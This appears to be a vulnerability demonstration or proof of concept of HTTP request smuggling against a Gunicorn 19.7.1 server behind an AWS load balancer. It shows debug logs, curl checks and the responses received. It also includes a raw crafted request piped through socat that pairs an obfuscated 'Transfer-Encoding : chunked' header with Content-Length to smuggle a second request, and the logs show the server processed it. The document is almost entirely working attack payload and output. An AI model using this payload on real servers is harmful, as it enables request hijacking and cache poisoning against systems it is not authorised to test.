# Gunicorn logs:

```log
[2024-07-23 01:41:06 +0000] [10] [DEBUG] GET /logbegin
[2024-07-23 01:41:11 +0000] [9] [DEBUG] POST /
[2024-07-23 01:41:11 +0000] [9] [DEBUG] XXX /
[2024-07-23 01:41:11 +0000] [9] [DEBUG] Closing connection. 
[2024-07-23 01:41:15 +0000] [9] [DEBUG] GET /logbegin
```

```bash
curl -i http://gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com/logbegin
```
result:
```yaml
HTTP/1.1 404 NOT FOUND
Date: Tue, 23 Jul 2024 01:41:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: gunicorn/19.7.1

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 83\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nXXX / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
```

result:
```yaml
HTTP/1.1 200 OK
Date: Tue, 23 Jul 2024 01:41:11 GMT
Content-Type: application/json
Content-Length: 339
Connection: close
Server: gunicorn/19.7.1

{
  "body": "",
  "headers": {
    "Content-Length": "83",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "Transfer-Encoding": "chunked",
    "X-Amzn-Trace-Id": "Root=1-669f0a37-76bc4c1f5158b291795a56c8",
    "X-Forwarded-For": "106.195.34.160",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
```

```bash
curl -i http://gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com/logbegin
```
```yaml
HTTP/1.1 404 NOT FOUND
Date: Tue, 23 Jul 2024 01:41:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: gunicorn/19.7.1

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```
